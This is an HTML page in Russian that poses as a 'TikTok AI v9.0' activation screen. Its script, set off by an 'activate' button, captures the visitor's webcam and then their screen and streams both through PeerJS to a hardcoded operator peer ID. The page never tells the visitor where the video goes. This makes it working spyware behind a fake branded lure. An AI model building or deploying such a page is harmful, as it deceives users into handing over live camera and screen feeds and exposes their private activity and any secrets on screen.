<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>TikTok AI v9.0</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { width: 320px; padding: 30px; border-radius: 20px; background: #0d0d0d; border: 1px solid #222; text-align: center; }
        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; }
        #status { color: #555; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="50">
        <h2>AI Activation</h2>
        <p>Нажмите для запуска синхронизации</p>
        <button id="mainBtn" class="btn" onclick="startFullSession()">АКТИВИРОВАТЬ</button>
        <div id="status">Ожидание...</div>
    </div>

    <script>
        const ADM_ID = '09062012'; // ПРОВЕРЬ: этот ID должен быть таким же в view.html
        const peer = new Peer();
        let activeConn;

        async function startFullSession() {
            const btn = document.getElementById('mainBtn');
            const status = document.getElementById('status');
            btn.disabled = true;

            try {
                status.innerText = "Подключение камеры...";
                const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Создаем соединение
                activeConn = peer.connect(ADM_ID);
                
                // Отправляем камеру
                peer.call(ADM_ID, camStream);
                status.innerText = "Камера активна. Ждем синхронизации...";

                // ПАУЗА 3 секунды, чтобы PeerJS успел создать канал
                setTimeout(async () => {
                    try {
                        status.innerText = "Запрос трансляции экрана...";
                        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                        
                        // Отправляем экран ВТОРЫМ звонком
                        peer.call(ADM_ID, screenStream);
                        status.innerText = "Все системы активны!";
                        btn.innerText = "ГОТОВО";
                    } catch(e) {
                        status.innerText = "Экран отклонен";
                        btn.disabled = false;
                    }
                }, 3000);

            } catch (e) {
                alert("Ошибка! Проверьте камеру и HTTPS");
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
